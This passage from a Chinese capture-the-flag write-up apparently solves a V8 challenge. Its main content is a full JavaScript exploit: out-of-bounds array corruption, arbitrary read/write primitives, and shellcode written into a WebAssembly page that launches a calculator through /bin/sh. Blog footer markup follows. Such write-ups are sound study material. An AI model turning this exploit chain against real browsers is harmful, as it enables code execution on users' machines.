class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; ((<span class="number">1024</span>*<span class="number">1024</span>));i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	dv.setFloat64(<span class="number">0</span>,val,<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">return</span> dv.getBigUint64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	dv.setBigUint64(<span class="number">0</span>,BigInt(val),<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">return</span> dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2half</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  f64[<span class="number">0</span>] = f;</span><br><span class="line">  <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(u32);</span><br><span class="line">  <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">half2f</span>(<span class="params">val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  u32.set(val);</span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64f</span>(<span class="params">high,low</span>)</span>&#123;</span><br><span class="line">  dv.setUint32(<span class="number">0</span>,high,<span class="literal">true</span>);</span><br><span class="line">  dv.setUint32(<span class="number">4</span>,low,<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">return</span> dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ByteToBigIntArray</span>(<span class="params">payload</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> sc = []</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="number">0n</span>;</span><br><span class="line">    <span class="keyword">let</span> lenInt = BigInt(<span class="built_in">Math</span>.floor(payload.length/<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0n</span>; i &lt; lenInt; i += <span class="number">1n</span>) &#123;</span><br><span class="line">        tmp = <span class="number">0n</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">0n</span>; j&lt;<span class="number">8n</span>; j++)&#123;</span><br><span class="line">            tmp += BigInt(payload[i*<span class="number">8n</span>+j])*(<span class="number">0x1n</span>&lt;&lt;(<span class="number">8n</span>*j));</span><br><span class="line">        &#125;</span><br><span class="line">        sc.push(tmp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> len = payload.length%<span class="number">8</span>;</span><br><span class="line">    tmp = <span class="number">0n</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0n</span>; i&lt;len; i++)&#123;</span><br><span class="line">        tmp += BigInt(payload[lenInt*<span class="number">8n</span>+i])*(<span class="number">0x1n</span>&lt;&lt;(<span class="number">8n</span>*i));</span><br><span class="line">    &#125;</span><br><span class="line">    sc.push(tmp);</span><br><span class="line">    <span class="keyword">return</span> sc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>,<span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>];</span><br><span class="line">arr.x = <span class="number">2</span>;</span><br><span class="line"><span class="comment">// gc();</span></span><br><span class="line"><span class="keyword">var</span> oob_arr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// gc();</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">idx</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo1</span>(<span class="params">idx, val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  arr[idx] = val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// %PrepareFunctionForOptimization(foo);</span></span><br><span class="line"><span class="comment">// foo(0);</span></span><br><span class="line"><span class="comment">// %OptimizeFunctionOnNextCall(foo);</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">  foo(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">  foo1(<span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// %DebugPrint(arr);</span></span><br><span class="line"><span class="comment">// %DebugPrint(oob_arr);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="comment">//change the map from array to dictionary</span></span><br><span class="line">arr[<span class="number">0x100000</span>] = <span class="number">13.37</span>;</span><br><span class="line"></span><br><span class="line">oob_arr = [<span class="number">1.337</span>];</span><br><span class="line"><span class="keyword">var</span> obj_arr = &#123;<span class="attr">mark</span>:<span class="number">0xdead</span>,<span class="attr">obj</span>:obj&#125;;</span><br><span class="line"><span class="keyword">var</span> big_arr = <span class="keyword">new</span> BigUint64Array(<span class="number">6</span>);</span><br><span class="line"><span class="comment">// big_arr =  ;</span></span><br><span class="line"><span class="comment">// %DebugPrint(arr);</span></span><br><span class="line"><span class="comment">// %DebugPrint(oob_arr);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="keyword">var</span> res = f2i(foo(<span class="number">30</span>)) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line"><span class="keyword">var</span> evil = <span class="number">0x3fc0n</span> * <span class="number">0x100000000n</span> + res;</span><br><span class="line">foo1(<span class="number">30</span>, i2f(evil));</span><br><span class="line"><span class="comment">// console.log(hex(f2i(8.063e-320)));</span></span><br><span class="line"><span class="comment">// console.log(hex(res));</span></span><br><span class="line"><span class="comment">// console.log(hex(evil));</span></span><br><span class="line"><span class="comment">// %DebugPrint(arr);</span></span><br><span class="line"><span class="comment">//get OOB arr</span></span><br><span class="line"><span class="comment">//leak the base and external pointer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> length_idx = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">var</span> external_idx = <span class="number">31</span>;</span><br><span class="line"><span class="keyword">var</span> base_idx = <span class="number">32</span>;</span><br><span class="line"><span class="comment">//leak the base and the external pointer</span></span><br><span class="line"><span class="keyword">var</span> length = f2i(oob_arr[length_idx]);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]The length of bigUint64Arr is : "</span> + hex(length));</span><br><span class="line"><span class="keyword">var</span> external_pointer = f2i(oob_arr[external_idx]);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]The external pointer is : "</span> + hex(external_pointer));</span><br><span class="line"><span class="keyword">var</span> base_pointer = f2i(oob_arr[base_idx]);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]The base pointer is : "</span> + hex(base_pointer));</span><br><span class="line">%DebugPrint(oob_arr);</span><br><span class="line">%DebugPrint(obj_arr);</span><br><span class="line">%DebugPrint(big_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">heap_read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//set base pointer</span></span><br><span class="line">  oob_arr[base_idx] = i2f(addr<span class="number">-0x8n</span>);</span><br><span class="line">  <span class="keyword">var</span> res = big_arr[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arb_read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  oob_arr[base_idx] = i2f(<span class="number">0n</span>);</span><br><span class="line">  oob_arr[external_idx] = i2f(addr);</span><br><span class="line">  <span class="keyword">var</span> res = big_arr[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arb_write</span>(<span class="params">addr, payload</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> payload_u64 = ByteToBigIntArray(payload);</span><br><span class="line">  oob_arr[length_idx] = i2f(payload_u64.length);</span><br><span class="line">  oob_arr[base_idx] = i2f(<span class="number">0n</span>);</span><br><span class="line">  oob_arr[external_idx] = i2f(addr);</span><br><span class="line">  <span class="comment">//set len</span></span><br><span class="line">  <span class="comment">// print(payload_u64);</span></span><br><span class="line">  <span class="comment">// %SystemBreak();</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; payload_u64.length; i++)&#123;</span><br><span class="line">    big_arr[i] = payload_u64[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wasm_func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> wasmImports = &#123;</span><br><span class="line">      env: &#123;</span><br><span class="line">          puts: <span class="function"><span class="keyword">function</span> <span class="title">puts</span> (<span class="params">index</span>) </span>&#123;</span><br><span class="line">              print(utf8ToString(h, index));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">137</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">      <span class="number">96</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">140</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">118</span>,<span class="number">4</span>,<span class="number">112</span>,<span class="number">117</span>,</span><br><span class="line">      <span class="number">116</span>,<span class="number">115</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">      <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">146</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,</span><br><span class="line">      <span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">141</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">      <span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">135</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">26</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">146</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line">      <span class="number">65</span>,<span class="number">16</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">32</span>,<span class="number">87</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">let</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(buffer),wasmImports);</span><br><span class="line">  <span class="keyword">let</span> h = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(m.exports.memory.buffer);</span><br><span class="line">  <span class="keyword">return</span> m.exports.hello;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> wasm_function = wasm_func();</span><br><span class="line"><span class="keyword">var</span> obj_idx = <span class="number">3</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  obj_arr.obj = obj;</span><br><span class="line">  <span class="keyword">return</span> f2i(oob_arr[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_function_addr = addressOf(wasm_function) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]wasm function addr : "</span> + hex(wasm_function_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = heap_read(wasm_function_addr+<span class="number">0xcn</span>) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] shared info addr : 0x"</span> + hex(shared_info_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_addr = heap_read(shared_info_addr+<span class="number">0x4n</span>) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] data addr : 0x"</span> + hex(data_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance_addr = heap_read(data_addr+<span class="number">0x8n</span>) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] instance addr : 0x"</span> + hex(instance_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_addr = heap_read(instance_addr+<span class="number">0x68n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] wasm addr : 0x"</span> + hex(wasm_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shellcode = [<span class="number">0x6a</span>,<span class="number">0x3b</span>,<span class="number">0x58</span>,<span class="number">0x99</span>,<span class="number">0x48</span>,<span class="number">0xbb</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x52</span>,<span class="number">0xe8</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x3d</span>,<span class="number">0x3a</span>,<span class="number">0x30</span>,<span class="number">0x20</span>,<span class="number">0x67</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x0f</span>,<span class="number">0x05</span>];</span><br><span class="line"></span><br><span class="line">arb_write(wasm_addr, shellcode);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">wasm_function();</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://googleprojectzero.blogspot.com/2019/05/trashing-flow-of-data.html" target="_blank" rel="noopener">Trashing the Flow of Data</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/06/24/qwb-gooexec/" rel="next" title="强网杯2020决赛-GooExec题解">
+                <i class="fa fa-chevron-left"></i> 强网杯2020决赛-GooExec题解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.png" alt="ama2in9">
+            
+              <p class="site-author-name" itemprop="name">ama2in9</p>
+              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">83</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/xmzyshypnc" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://linkleyping.top/" title="Ep" target="_blank">Ep</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://t3ls.club/" title="t3ls" target="_blank">t3ls</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://keenan.top/" title="keenan" target="_blank">keenan</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://021w.github.io/" title="021w" target="_blank">021w</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#华为XCTF专场-HWS-v8-暨-WCTF2019-independency-day题解"><span class="nav-number">1.</span> <span class="nav-text">华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.5.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ama2in9</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'http://ama2in9.top/2021/07/06/hws-v8/';
+        this.page.identifier = '2021/07/06/hws-v8/';
+        this.page.title = '华为XCTF专场-HWS-v8 暨 WCTF2019-independency_day题解';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
